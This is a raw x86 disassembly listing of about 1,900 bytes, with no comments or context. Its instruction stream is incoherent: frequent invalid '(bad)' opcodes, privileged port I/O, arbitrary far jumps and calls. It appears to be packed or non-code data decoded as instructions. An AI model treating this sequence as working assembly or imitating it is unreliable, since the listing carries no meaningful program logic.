  41ae64:	mov    ah,0x1d
  41ae66:	outs   dx,DWORD PTR ds:[esi]
  41ae67:	sub    bl,BYTE PTR [esi+0x49dcbf1a]
  41ae6d:	mov    bh,0x46
  41ae6f:	push   0xffffff80
  41ae71:	into   
  41ae72:	jbe    0x41aebf
  41ae74:	in     eax,dx
  41ae75:	xchg   edx,eax
  41ae76:	dec    edi
  41ae77:	std    
  41ae78:	sub    BYTE PTR [edx],bl
  41ae7a:	loope  0x41ae2f
  41ae7c:	add    eax,0x1730587d
  41ae81:	daa    
  41ae82:	mov    gs,WORD PTR [edi+ecx*4-0x4d]
  41ae86:	jnp    0x41aed5
  41ae88:	cmp    al,0x3a
  41ae8a:	enter  0xfde9,0x8b
  41ae8e:	out    dx,eax
  41ae8f:	aas    
  41ae90:	and    al,0x79
  41ae92:	inc    edi
  41ae93:	imul   edi,ebp,0xcda7aec6
  41ae99:	pop    ebx
  41ae9a:	inc    edi
  41ae9b:	imul   ebx,DWORD PTR [ecx-0x2c68286d],0xffffff8e
  41aea2:	xor    al,0xdf
  41aea4:	inc    esi
  41aea5:	jb     0x41aefd
  41aea7:	call   0x2ab8f1b9
  41aeac:	aaa    
  41aead:	mov    al,0xcf
  41aeaf:	mov    DWORD PTR [esi+0x38],ebp
  41aeb2:	or     ebp,eax
  41aeb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb5:	adc    esi,esp
  41aeb7:	sbb    ah,BYTE PTR [ecx-0x3a]
  41aeba:	xor    al,0xda
  41aebc:	pop    edi
  41aebd:	dec    eax
  41aebe:	mov    dl,0xd
  41aec0:	mov    esp,DWORD PTR [eax]
  41aec2:	rcr    BYTE PTR [ebp-0x7258f09c],1
  41aec8:	ja     0x41af27
  41aeca:	or     DWORD PTR [esi-0x55],edx
  41aecd:	xchg   edi,eax
  41aece:	pop    esi
  41aecf:	dec    ebx
  41aed0:	nop
  41aed1:	inc    ecx
  41aed2:	pop    ds
  41aed3:	dec    ebx
  41aed4:	mov    eax,esi
  41aed6:	clc    
  41aed7:	pop    edx
  41aed8:	jns    0x41ae73
  41aeda:	add    al,0x49
  41aedc:	(bad)  
  41aede:	cmp    BYTE PTR [edx+0x4b],al
  41aee1:	ja     0x41ae96
  41aee3:	push   0xffffffb7
  41aee5:	push   ds
  41aee6:	(bad)  
  41aee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aee8:	cmp    ch,BYTE PTR [ebx+0x6cc8fae6]
  41aeee:	xlat   BYTE PTR ds:[ebx]
  41aeef:	push   ecx
  41aef0:	test   DWORD PTR [ecx-0x44],ecx
  41aef3:	pop    es
  41aef4:	jge    0x41aeee
  41aef6:	and    al,0x48
  41aef8:	xor    edx,DWORD PTR [edi+0x21]
  41aefb:	or     al,0x9a
  41aefd:	mov    ds:0x2d56c312,eax
  41af02:	adc    al,BYTE PTR [eax+0x14]
  41af05:	out    dx,eax
  41af06:	(bad)  
  41af07:	xor    DWORD PTR [ebx],esp
  41af09:	mov    ecx,0x4541fe5c
  41af0e:	mov    gs,edx
  41af10:	out    dx,eax
  41af11:	push   ebx
  41af12:	mov    WORD PTR [esi+0x6a],es
  41af15:	pop    ss
  41af16:	loop   0x41aee6
  41af18:	les    eax,FWORD PTR [esi]
  41af1a:	xchg   ecx,eax
  41af1b:	push   0x57
  41af1d:	pop    edx
  41af1e:	push   cs
  41af1f:	xor    al,BYTE PTR ds:0xfe80a88b
  41af25:	(bad)  
  41af26:	mov    dh,0x53
  41af28:	sbb    al,0x27
  41af2a:	sbb    edx,DWORD PTR [edx]
  41af2c:	pop    ds
  41af2d:	or     edi,DWORD PTR [edx+0x8cc25ae]
  41af33:	fucomi st,st(3)
  41af35:	add    eax,0x342b4bb1
  41af3a:	sahf   
  41af3b:	fst    DWORD PTR [esp+ecx*1]
  41af3e:	mul    BYTE PTR [ebp-0x2460aa5d]
  41af44:	adc    esp,0xcd538859
  41af4a:	arpl   dx,cx
  41af4c:	or     al,0x6b
  41af4e:	in     eax,0xf4
  41af50:	mov    ch,0x57
  41af52:	mov    al,ds:0x7cfae53e
  41af57:	call   0xfde9:0xbe02ddd4
  41af5e:	sbb    DWORD PTR [ebx+ecx*8-0x471250f],edx
  41af65:	mov    ch,0x9
  41af67:	dec    ebx
  41af68:	test   DWORD PTR [edx+0x52c3ecf1],eax
  41af6e:	xchg   ebx,eax
  41af6f:	mov    dh,0xae
  41af71:	xchg   ecx,eax
  41af72:	sahf   
  41af73:	mov    dh,0x9
  41af75:	lods   al,BYTE PTR ds:[esi]
  41af76:	test   DWORD PTR [ebx],ecx
  41af78:	pop    ds
  41af79:	jae    0x41af39
  41af7b:	fwait
  41af7c:	xlat   BYTE PTR ds:[ebx]
  41af7d:	xchg   edi,eax
  41af7e:	jb     0x41af74
  41af80:	outs   dx,BYTE PTR ds:[esi]
  41af81:	shr    dl,0x72
  41af84:	daa    
  41af85:	outs   dx,BYTE PTR ds:[esi]
  41af86:	popa   
  41af87:	aaa    
  41af88:	out    dx,eax
  41af89:	cld    
  41af8a:	mov    ds:0xab71c258,eax
  41af8f:	add    dl,BYTE PTR [esi]
  41af91:	imul   ecx,DWORD PTR [edi+0x68],0xffffff9f
  41af95:	and    cl,0x93
  41af98:	ss xchg ecx,eax
  41af9a:	jbe    0x41af29
  41af9c:	int3   
  41af9d:	loope  0x41af21
  41af9f:	(bad)  
  41afa1:	scas   eax,DWORD PTR es:[edi]
  41afa2:	repnz sub ebx,DWORD PTR [edx]
  41afa5:	and    ch,BYTE PTR [edi]
  41afa7:	sbb    eax,0x6f9add93
  41afac:	icebp  
  41afad:	dec    esi
  41afae:	inc    esi
  41afaf:	mov    cl,0x74
  41afb1:	sahf   
  41afb2:	push   esp
  41afb3:	pop    esi
  41afb4:	out    0x19,eax
  41afb6:	dec    ebp
  41afb7:	gs mov bl,0xac
  41afba:	aaa    
  41afbb:	sub    dl,BYTE PTR [edi]
  41afbd:	push   ss
  41afbe:	ja     0x41afb1
  41afc0:	jo     0x41af66
  41afc2:	jmp    0x239c:0x657370f1
  41afc9:	adc    al,0xe3
  41afcb:	push   eax
  41afcc:	ins    DWORD PTR es:[edi],dx
  41afcd:	mov    ebx,0x1ede3fa5
  41afd2:	xor    esi,ebp
  41afd4:	push   ebp
  41afd5:	addr16 push ebp
  41afd7:	cmp    bl,dh
  41afd9:	dec    eax
  41afda:	fstp   QWORD PTR [edi+0x1e3a1c9]
  41afe0:	mov    ?,esp
  41afe2:	add    ecx,DWORD PTR [edi+ebx*4-0x1e]
  41afe6:	cli    
  41afe7:	out    dx,al
  41afe8:	pop    es
  41afe9:	xor    bl,cl
  41afeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afec:	rol    DWORD PTR [ecx-0x38e5fea5],cl
  41aff2:	(bad)  
  41aff4:	pop    esp
  41aff5:	pop    ebx
  41aff6:	mov    ch,BYTE PTR [edx-0x5]
  41aff9:	sbb    al,0x5d
  41affb:	cs mov cl,0x11
  41affe:	retf   0x5c62
  41b001:	push   esp
  41b002:	(bad)  
  41b004:	sti    
  41b005:	jmp    0x56a95f75
  41b00a:	inc    esp
  41b00b:	fwait
  41b00c:	gs push eax
  41b00e:	sub    al,0x68
  41b010:	ins    DWORD PTR es:[edi],dx
  41b011:	push   0x5c
  41b013:	sar    BYTE PTR [eax+edi*2],cl
  41b016:	push   edi
  41b017:	xchg   DWORD PTR [eax-0x60],edx
  41b01a:	addr16 aam 0xdf
  41b01d:	jne    0x41afd0
  41b01f:	ins    DWORD PTR es:[edi],dx
  41b020:	mov    edi,0x6dcdcdc7
  41b025:	loope  0x41b049
  41b027:	inc    ebx
  41b028:	shl    ecx,0x42
  41b02b:	jp     0x41afd2
  41b02d:	mov    esp,0x70f3a7bb
  41b032:	mov    eax,0xabb46f38
  41b037:	xchg   esp,eax
  41b038:	les    edx,FWORD PTR [esi-0x29]
  41b03b:	fidivr WORD PTR [edi+0x47]
  41b03e:	out    dx,al
  41b03f:	rol    edi,0x59
  41b042:	mov    ecx,0x89a4c079
  41b047:	lods   al,BYTE PTR ds:[esi]
  41b048:	iret   
  41b049:	mov    ebp,0x5823fc5
  41b04e:	dec    ebx
  41b04f:	icebp  
  41b050:	dec    ebp
  41b051:	sub    al,0x25
  41b053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b054:	neg    DWORD PTR [edx-0x5b]
  41b057:	pop    ecx
  41b058:	xor    ebp,DWORD PTR [ecx]
  41b05a:	push   edx
  41b05b:	shl    DWORD PTR [edx],0x39
  41b05e:	int3   
  41b05f:	jae    0x41b0dd
  41b061:	rcr    BYTE PTR [edx+0x7074d6c],1
  41b067:	mov    bh,0xac
  41b069:	push   edi
  41b06a:	daa    
  41b06b:	call   0x576d:0xd41c9ddc
  41b072:	stos   DWORD PTR es:[edi],eax
  41b073:	loop   0x41b0e2
  41b075:	loop   0x41b036
  41b077:	pop    ss
  41b078:	add    BYTE PTR [ebp-0x28db1dcb],ah
  41b07e:	cwde   
  41b07f:	dec    ebx
  41b080:	xor    ebp,ebx
  41b082:	fnstcw WORD PTR [esi]
  41b084:	pop    ebx
  41b085:	fidiv  DWORD PTR [ebp+0x60]
  41b088:	and    bl,BYTE PTR [esi+ebx*8]
  41b08b:	les    esp,FWORD PTR [edx+0x33f73b88]
  41b091:	pop    ss
  41b092:	dec    esp
  41b093:	mov    DWORD PTR [ebx+edi*4+0x1f],0xcc91800b
  41b09b:	sahf   
  41b09c:	xor    edi,edi
  41b09e:	outs   dx,BYTE PTR ds:[esi]
  41b09f:	sbb    eax,DWORD PTR [ebp+0xc]
  41b0a2:	mov    BYTE PTR [ecx-0x46],bh
  41b0a5:	pop    esp
  41b0a6:	inc    edi
  41b0a7:	xchg   edi,eax
  41b0a8:	je     0x41b117
  41b0aa:	adc    ebx,0xb33b412a
  41b0b0:	jl     0x41b0f5
  41b0b2:	aad    0xbf
  41b0b4:	mov    edx,0x7b242ea2
  41b0b9:	pop    edi
  41b0ba:	jmp    0xe89c6cce
  41b0bf:	inc    ebx
  41b0c0:	repnz cmp eax,0xca1c6cce
  41b0c6:	mov    cl,0xd2
  41b0c8:	sahf   
  41b0c9:	dec    esp
  41b0ca:	pushf  
  41b0cb:	js     0x41b06a
  41b0cd:	aaa    
  41b0ce:	and    al,0x3
  41b0d0:	stos   BYTE PTR es:[edi],al
  41b0d1:	retf   
  41b0d2:	dec    edx
  41b0d3:	mov    ebx,0xefb40343
  41b0d8:	mov    ecx,0xbcc6a005
  41b0dd:	mov    eax,ds:0x591f3ca6
  41b0e2:	jge    0x41b0d7
  41b0e4:	outs   dx,BYTE PTR ds:[esi]
  41b0e5:	cwde   
  41b0e6:	push   edx
  41b0e7:	and    ecx,DWORD PTR [edi]
  41b0e9:	in     ax,0x9c
  41b0ec:	gs leave 
  41b0ee:	ds in  al,dx
  41b0f0:	sti    
  41b0f1:	dec    ebp
  41b0f2:	jne    0x41b12c
  41b0f4:	mov    edx,0xf3023e0a
  41b0f9:	jnp    0x41b0c5
  41b0fb:	(bad)  
  41b0fd:	jae    0x41b089
  41b0ff:	inc    edx
  41b100:	cmp    al,0x43
  41b102:	dec    edx
  41b103:	cmp    bh,cl
  41b105:	outs   dx,DWORD PTR ds:[esi]
  41b106:	xchg   esp,eax
  41b107:	fwait
  41b108:	add    BYTE PTR [ebx],dh
  41b10a:	pop    edx
  41b10b:	adc    eax,0x938e1e04
  41b110:	in     al,0x36
  41b112:	or     al,0xe
  41b114:	mov    ch,0x29
  41b116:	xchg   DWORD PTR ds:0x27e6e886,ebp
  41b11c:	stos   BYTE PTR es:[edi],al
  41b11d:	cli    
  41b11e:	and    BYTE PTR [edi*2-0x18700680],bh
  41b125:	pushf  
  41b126:	bnd jnp 0x41b14f
  41b129:	xor    eax,0x9dbaad1e
  41b12e:	fistp  WORD PTR [ebx]
  41b130:	sub    DWORD PTR [eax],edx
  41b132:	les    edx,FWORD PTR [edx+0xf05dcc0]
  41b138:	mov    bl,0x30
  41b13a:	xchg   DWORD PTR [edi],esp
  41b13c:	xchg   ebx,edi
  41b13e:	push   esi
  41b13f:	dec    esi
  41b140:	cmp    ebp,edi
  41b142:	add    edx,DWORD PTR [ebx]
  41b144:	not    esp
  41b146:	sbb    ebx,edi
  41b148:	cs pop ecx
  41b14a:	movntps XMMWORD PTR ds:0x9e0b093d,xmm1
  41b151:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b153:	adc    cl,BYTE PTR [ecx]
  41b155:	sub    eax,0xb372d1c7
  41b15a:	je     0x41b0dc
  41b15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b15d:	les    edx,FWORD PTR [edi-0x3e]
  41b160:	mov    WORD PTR [ecx],cs
  41b162:	scas   eax,DWORD PTR es:[edi]
  41b163:	jno    0x41b161
  41b165:	sbb    BYTE PTR [ecx-0x28],bh
  41b168:	sub    BYTE PTR [ebx],dl
  41b16a:	or     DWORD PTR [eax],0xffffffd0
  41b16d:	ficom  WORD PTR [ecx+0x3f]
  41b170:	push   cs
  41b171:	cs push cs
  41b173:	iret   
  41b174:	and    DWORD PTR [esi+0x4314e752],edi
  41b17a:	mov    WORD PTR [edi+ebx*8-0x2],ds
  41b17e:	pmaxub mm6,QWORD PTR [edx]
  41b181:	hlt    
  41b182:	dec    esp
  41b183:	jmp    0xf194:0x35752397
  41b18a:	clc    
  41b18b:	adc    al,bh
  41b18d:	mov    al,BYTE PTR [eax-0x29]
  41b190:	cmp    al,0xa7
  41b192:	icebp  
  41b193:	loopne 0x41b1e7
  41b195:	and    DWORD PTR [ebp-0x1cced508],eax
  41b19b:	add    eax,DWORD PTR [ebp-0x75b8c8f2]
  41b1a1:	lods   al,BYTE PTR ds:[esi]
  41b1a2:	pop    ebx
  41b1a3:	jmp    0x65e0:0xfec40ae4
  41b1aa:	mov    BYTE PTR ds:0x18fb254a,cl
  41b1b0:	in     al,0x5a
  41b1b2:	scas   eax,DWORD PTR es:[edi]
  41b1b3:	mov    dl,0x8
  41b1b5:	out    0xf2,al
  41b1b7:	int    0x66
  41b1b9:	dec    ebx
  41b1ba:	(bad)  
  41b1bb:	cmp    eax,0xb1dd0e82
  41b1c0:	push   ecx
  41b1c1:	push   esi
  41b1c2:	sbb    bh,BYTE PTR [eax-0x5b]
  41b1c5:	push   edi
  41b1c6:	repnz (bad) 
  41b1c8:	int3   
  41b1c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ca:	jmp    0x41b18c
  41b1cc:	push   edi
  41b1cd:	sti    
  41b1ce:	inc    ebx
  41b1cf:	repz fs xor al,0x91
  41b1d3:	test   DWORD PTR [ebx+0x52],0xff4611ec
  41b1da:	gs cli 
  41b1dc:	gs cmp eax,0x21f63666
  41b1e2:	push   edi
  41b1e3:	mov    esi,0xafef4bec
  41b1e8:	lods   al,BYTE PTR ds:[esi]
  41b1e9:	inc    edi
  41b1ea:	aam    0xa7
  41b1ec:	push   eax
  41b1ed:	pop    eax
  41b1ee:	and    eax,0x872d00e8
  41b1f3:	pop    edx
  41b1f4:	xchg   BYTE PTR [ecx-0x7d103fed],bl
  41b1fa:	sbb    BYTE PTR [ebp+0x62c6d7f4],dl
  41b200:	ret    0x77ef
  41b203:	mov    ds:0x7a6c166f,al
  41b208:	mov    WORD PTR [edx],?
  41b20a:	mov    ?,WORD PTR [ebp-0x1502f6b0]
  41b210:	xchg   edx,eax
  41b211:	adc    eax,0xcd73bb55
  41b216:	call   DWORD PTR [esp+eax*4]
  41b219:	scas   al,BYTE PTR es:[edi]
  41b21a:	sub    BYTE PTR [edx+ebp*1+0x49],bh
  41b21e:	jmp    0x41b1a9
  41b220:	add    BYTE PTR [ebp+eiz*4+0xf],dh
  41b224:	fs call 0x59cc:0xa4bdac74
  41b22c:	xor    DWORD PTR [ebp+0xf6c80e0],esi
  41b232:	std    
  41b233:	push   ebx
  41b234:	jecxz  0x41b1d7
  41b236:	imul   edi,esp,0xffffffd2
  41b239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b23a:	test   eax,ebx
  41b23c:	xor    DWORD PTR [eax],ecx
  41b23e:	out    0xf5,eax
  41b240:	or     al,0xa
  41b242:	std    
  41b243:	push   ecx
  41b244:	dec    eax
  41b245:	mov    esi,0x372745cf
  41b24a:	fs loop 0x41b274
  41b24d:	sub    al,ch
  41b24f:	xor    al,0xc9
  41b251:	sbb    DWORD PTR [ebp+0x3a],ebx
  41b254:	(bad)  
  41b255:	cmc    
  41b256:	retf   
  41b257:	xlat   BYTE PTR ds:[ebx]
  41b258:	test   eax,0x61a49a4c
  41b25d:	inc    ebp
  41b25e:	icebp  
  41b25f:	in     al,dx
  41b260:	sub    eax,0x2ef74134
  41b265:	pop    esp
  41b266:	out    0xa5,eax
  41b268:	test   BYTE PTR [ebx-0x51],0xe8
  41b26c:	aad    0x87
  41b26e:	js     0x41b23c
  41b270:	jbe    0x41b201
  41b272:	mov    DWORD PTR [edx+0x17],ecx
  41b275:	jp     0x41b2f4
  41b277:	or     BYTE PTR [eax+0x742c7bf4],ch
  41b27d:	mov    es,ebp
  41b27f:	pop    edi
  41b280:	sbb    eax,0x284dae9
  41b285:	bound  ebp,QWORD PTR ds:0x936280fe
  41b28b:	dec    ebp
  41b28c:	iret   
  41b28d:	inc    ecx
  41b28e:	mov    cl,0x3e
  41b290:	fiadd  DWORD PTR [esi-0x46e5d1c0]
  41b296:	lock and ebx,DWORD PTR [esi+edi*2]
  41b29a:	(bad)
  41b29e:	jl     0x41b296
  41b2a0:	push   cs
  41b2a1:	sub    DWORD PTR [edx-0x2d54bcf5],esi
  41b2a7:	dec    esi
  41b2a8:	fistp  WORD PTR [ebx+0x57]
  41b2ab:	fs jne 0x41b302
  41b2ae:	push   esi
  41b2af:	add    BYTE PTR [esi-0x19],ah
  41b2b2:	les    ebx,FWORD PTR [esi]
  41b2b4:	aas    
  41b2b5:	sub    esp,ecx
  41b2b7:	addr16 in eax,dx
  41b2b9:	mov    dh,0x0
  41b2bb:	or     al,0x6b
  41b2bd:	push   edx
  41b2be:	inc    ecx
  41b2bf:	aas    
  41b2c0:	ret    0x928e
  41b2c3:	sub    ebx,DWORD PTR [esi+0x4db0d4e6]
  41b2c9:	shl    dl,cl
  41b2cb:	(bad)  
  41b2cd:	mov    bl,0xa4
  41b2cf:	mov    ch,BYTE PTR [ecx]
  41b2d1:	dec    eax
  41b2d2:	arpl   WORD PTR [eax+ecx*8+0x76],bx
  41b2d6:	dec    ecx
  41b2d7:	sbb    DWORD PTR [ecx],esi
  41b2d9:	jns    0x41b281
  41b2db:	dec    edx
  41b2dc:	jne    0x41b28d
  41b2de:	les    ax,DWORD PTR [ebp+0x20]
  41b2e2:	scas   eax,DWORD PTR es:[edi]
  41b2e3:	xor    al,BYTE PTR [esi+0x1b460b94]
  41b2e9:	sub    eax,0xed7a5638
  41b2ee:	aad    0x24
  41b2f0:	lods   eax,DWORD PTR cs:[esi]
  41b2f2:	loop   0x41b2dc
  41b2f4:	sub    BYTE PTR [esi+0x2d],al
  41b2f7:	popf   
  41b2f8:	adc    esi,ebx
  41b2fa:	fs mov dl,0x61
  41b2fd:	fs fcmovu st,st(4)
  41b300:	pop    ds
  41b301:	jne    0x41b28a
  41b303:	push   esi
  41b304:	cmp    DWORD PTR [esi],esi
  41b306:	xor    DWORD PTR [esi-0x1],0x743eb640
  41b30d:	cld    
  41b30e:	mov    cl,0x95
  41b310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b311:	mov    DWORD PTR [edx-0x232d0fbf],esi
  41b317:	retf   0xdafd
  41b31a:	bound  esp,QWORD PTR [ebx+eax*4-0x48]
  41b31e:	test   eax,0xe9a00809
  41b323:	or     cl,BYTE PTR [ebp-0x352370a2]
  41b329:	out    dx,eax
  41b32a:	inc    ebp
  41b32b:	fcmovnbe st,st(5)
  41b32d:	xchg   edx,eax
  41b32e:	mov    al,0xd
  41b330:	adc    bl,0x9d
  41b333:	lahf   
  41b334:	dec    ecx
  41b335:	sbb    edx,DWORD PTR [edx-0xc]
  41b338:	mov    edi,0x298af359
  41b33d:	(bad)  
  41b33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b33f:	mov    edx,0xde9530ef
  41b344:	dec    esi
  41b345:	lods   al,BYTE PTR ds:[esi]
  41b346:	ds js  0x41b39c
  41b349:	mov    bh,0x63
  41b34b:	call   0xe06d:0xed9437e
  41b352:	jb     0x41b3c1
  41b354:	aas    
  41b355:	push   es
  41b356:	stos   DWORD PTR es:[edi],eax
  41b357:	out    0x9b,eax
  41b359:	add    al,0x32
  41b35b:	ja     0x41b3c8
  41b35d:	adc    DWORD PTR [edi+0x0],ecx
  41b360:	in     eax,0x7
  41b362:	sbb    BYTE PTR [edx],cl
  41b364:	cmp    esi,esp
  41b366:	pop    eax
  41b367:	test   al,0xd2
  41b369:	xchg   ebp,eax
  41b36a:	mov    DWORD PTR [edx+0x76],0xcc816b32
  41b371:	aad    0x0
  41b373:	(bad)  
  41b374:	cmp    edi,DWORD PTR [ebx]
  41b376:	shl    BYTE PTR [ecx-0x77],cl
  41b379:	and    DWORD PTR [ecx+0x79b5f07],edi
  41b37f:	mov    ds:0xc0e107b8,eax
  41b384:	dec    esp
  41b385:	pop    es
  41b386:	mov    DWORD PTR [eax-0x1920fec0],ecx
  41b38c:	mov    ah,BYTE PTR [esi-0x2cb2ca98]
  41b392:	pushf  
  41b393:	daa    
  41b394:	sti    
  41b395:	cdq    
  41b396:	inc    esi
  41b397:	xor    BYTE PTR [ecx-0x171d0ecb],bl
  41b39d:	adc    BYTE PTR [eax-0x7b],bl
  41b3a0:	shr    DWORD PTR [ebx],0x3c
  41b3a3:	and    DWORD PTR [edi+0x24],edx
  41b3a6:	xchg   ebx,eax
  41b3a7:	mov    BYTE PTR [esi],ch
  41b3a9:	(bad)
  41b3ac:	test   DWORD PTR [edi+0x0],0x640f6251
  41b3b3:	adc    bh,BYTE PTR ds:0x396e4d69
  41b3b9:	mov    esi,0x64aa1ac9
  41b3be:	push   ebp
  41b3bf:	fucomp st(0)
  41b3c1:	add    DWORD PTR [edi+0x144560af],ebx
  41b3c7:	cmp    esi,DWORD PTR [ecx+0x38]
  41b3ca:	xor    dl,BYTE PTR [edi+0x84f606b]
  41b3d0:	js     0x41b36f
  41b3d2:	lods   al,BYTE PTR ds:[esi]
  41b3d3:	aad    0xdc
  41b3d5:	cs in  al,dx
  41b3d7:	imul   esp,DWORD PTR [esi],0xfffffff7
  41b3da:	sbb    eax,DWORD PTR [edx+0x2f]
  41b3dd:	test   eax,0xf18dfb7d
  41b3e2:	or     eax,0xae9314a7
  41b3e7:	addr16 push esi
  41b3e9:	repz scas eax,DWORD PTR es:[edi]
  41b3eb:	loopne 0x41b3cc
  41b3ed:	retf   
  41b3ee:	mov    esi,0x8e6ce491
  41b3f3:	ja     0x41b444
  41b3f5:	sbb    DWORD PTR [ebx+0x4eebed50],esp
  41b3fb:	sub    eax,0x3d7fca37
  41b400:	push   ebx
  41b401:	jmp    0xd512dfbb
  41b406:	repnz nop
  41b408:	jmp    0x2adc:0x81920b0
  41b40f:	dec    ebp
  41b410:	in     al,dx
  41b411:	das    
  41b412:	bound  eax,QWORD PTR [esp+edx*1-0x4aa72859]
  41b419:	xchg   edx,eax
  41b41a:	inc    eax
  41b41b:	lock in eax,0xba
  41b41e:	fwait
  41b41f:	sbb    eax,0xf9ef43b1
  41b424:	dec    ebp
  41b425:	xchg   esp,eax
  41b426:	imul   edx,DWORD PTR [edx],0x40f125ea
  41b42c:	mov    esi,0xb9bede88
  41b431:	adc    ah,BYTE PTR [edx]
  41b433:	push   cs
  41b434:	jns    0x41b48e
  41b436:	push   esp
  41b437:	cmp    ecx,DWORD PTR [edi+0x13e842ff]
  41b43d:	xor    eax,0x8528ba15
  41b442:	and    edx,ecx
  41b444:	fninit 
  41b446:	repz mov edi,0xb22bddb5
  41b44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b44d:	in     al,0xff
  41b44f:	cmp    BYTE PTR [edx],cl
  41b451:	push   ecx
  41b452:	fcmovne st,st(4)
  41b454:	mov    ebp,esp
  41b456:	and    al,0xde
  41b458:	fiadd  WORD PTR [ebx+0x40]
  41b45b:	daa    
  41b45c:	js     0x41b41f
  41b45e:	jmp    0x38bf41c8
  41b463:	mov    ebp,0x1c94c51c
  41b468:	fimul  DWORD PTR [esi+esi*4]
  41b46b:	rol    BYTE PTR [eax+ecx*2+0x50bd0baa],cl
  41b472:	push   eax
  41b473:	jbe    0x41b4e8
  41b475:	pop    ecx
  41b476:	addr16 push edi
  41b478:	psubusb mm2,QWORD PTR [edi+0x108e1135]
  41b47f:	je     0x41b4f8
  41b481:	iret   
  41b482:	pop    edx
  41b483:	loope  0x41b4ed
  41b485:	fstp   DWORD PTR gs:0x9cd199c4
  41b48c:	fldz   
  41b48e:	je     0x41b460
  41b490:	loopne 0x41b46b
  41b492:	jne    0x41b4d6
  41b494:	scas   eax,DWORD PTR es:[edi]
  41b495:	sub    BYTE PTR gs:[esi-0x5b],ah
  41b499:	push   esp
  41b49a:	sbb    al,0xff
  41b49c:	pop    es
  41b49d:	jge    0x41b46c
  41b49f:	out    0xe6,al
  41b4a1:	cmp    DWORD PTR [esi+0x5a6e2001],eax
  41b4a7:	popa   
  41b4a8:	dec    DWORD PTR gs:[ebx+0x12]
  41b4ac:	shl    DWORD PTR [edi-0x2e749597],1
  41b4b2:	add    ecx,edx
  41b4b4:	jg     0x41b46f
  41b4b6:	dec    ecx
  41b4b7:	add    dl,0xef
  41b4ba:	call   0x157a:0x3d0ea293
  41b4c1:	cmp    BYTE PTR [esi+edx*2+0x5c],ch
  41b4c5:	xchg   DWORD PTR [ebx+0x69],ecx
  41b4c8:	int3   
  41b4c9:	jnp    0x41b523
  41b4cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4cc:	xchg   ch,ah
  41b4ce:	jne    0x41b541
  41b4d0:	mov    WORD PTR [eax+0x71],?
  41b4d3:	dec    eax
  41b4d4:	fisubr DWORD PTR [ebx-0x60]
  41b4d7:	imul   DWORD PTR [esi-0x31]
  41b4da:	std    
  41b4db:	jp     0x41b559
  41b4dd:	mov    ah,ch
  41b4df:	mov    eax,ds:0x8f6e3b27
  41b4e4:	dec    esp
  41b4e5:	lods   eax,DWORD PTR ds:[esi]
  41b4e6:	fldenv ds:0xa73fa4fc
  41b4ec:	add    bl,dl
  41b4ee:	jnp    0x41b567
  41b4f0:	mov    eax,0xfb4c6899
  41b4f5:	sub    bh,BYTE PTR [ebx]
  41b4f7:	in     al,dx
  41b4f8:	ds xchg esi,eax
  41b4fa:	lock mov fs:0xb1551677,al
  41b501:	mov    ebp,0xbec6e191
  41b506:	adc    al,dl
  41b508:	or     eax,ebp
  41b50a:	push   esp
  41b50b:	or     eax,DWORD PTR [esi+0x3c60d9c7]
  41b511:	fnstcw WORD PTR [eax-0x60c9846c]
  41b517:	and    al,0x60
  41b519:	das    
  41b51a:	cmp    BYTE PTR [eax-0x46aed506],al
  41b520:	xchg   edi,eax
  41b521:	push   eax
  41b522:	sub    ecx,DWORD PTR [edx-0x1c28cd26]
  41b528:	or     esi,DWORD PTR [esi+0x43]
  41b52b:	xlat   BYTE PTR ds:[ebx]
  41b52c:	jbe    0x41b5aa
  41b52e:	adc    BYTE PTR [edi+0x62],dl
  41b531:	ror    BYTE PTR [esi],0x11
  41b534:	sbb    eax,0xb836facb
  41b539:	dec    edi
  41b53a:	dec    ecx
  41b53b:	mov    esp,0xf91b39b
  41b540:	ret    
  41b541:	adc    esi,DWORD PTR [edx+esi*1+0x27f4d51c]
  41b548:	sub    DWORD PTR [edi],ebx
  41b54a:	nop
  41b54b:	cld    
  41b54c:	sti    
  41b54d:	fisub  DWORD PTR [ecx+0x16e013b5]
  41b553:	cdq    
  41b554:	and    DWORD PTR [ebx+ebp*8+0x27],ebp
  41b558:	arpl   bp,dx
  41b55a:	sbb    edi,DWORD PTR [edx]
  41b55c:	enter  0xefb1,0x12
  41b560:	mov    al,ds:0xeec08e4
  41b565:	adc    BYTE PTR [ecx-0x7b336324],ah
  41b56b:	push   esi
  41b56c:	je     0x41b4f2
  41b56e:	inc    ecx
  41b56f:	repz pop esi
  41b571:	inc    esi
  41b572:	popf   
  41b573:	mov    ch,0xbb
  41b575:	jns    0x41b532
  41b577:	in     al,dx
  41b578:	push   es
  41b579:	popf   
  41b57a:	outs   dx,DWORD PTR ds:[esi]
  41b57b:	adc    al,0x4e
  41b57d:	lahf   
  41b57e:	fstp   QWORD PTR [eax+0x71]
  41b581:	ret    
  41b582:	stc    
  41b583:	fld    TBYTE PTR [edx-0x3b]
  41b586:	or     ecx,DWORD PTR [edi]
  41b588:	add    ebp,DWORD PTR [ebx-0x1bcdee52]
  41b58e:	inc    eax
  41b58f:	push   0xc7bb143
  41b594:	inc    eax
  41b595:	jle    0x41b610
  41b597:	or     bl,BYTE PTR [edi-0x75d9d0be]
  41b59d:	stc    
  41b59e:	and    edi,esp
  41b5a0:	dec    ebp
  41b5a1:	cmp    eax,0x50c86c90
  41b5a6:	lds    ecx,FWORD PTR [edi+0x284d6d72]
  41b5ac:	int3   
  41b5ad:	nop
  41b5ae:	inc    edx
  41b5af:	jae    0x41b532
  41b5b1:	jmp    esp
  41b5b3:	outs   dx,BYTE PTR ds:[esi]
  41b5b4:	dec    esi
  41b5b5:	xchg   DWORD PTR [ecx],ecx
  41b5b7:	push   0xcb6c34eb
  41b5bc:	sbb    BYTE PTR [edx+ebx*2],dh
  41b5bf:	cmp    al,0x35
  41b5c1:	data16 std 
  41b5c3:	pop    eax
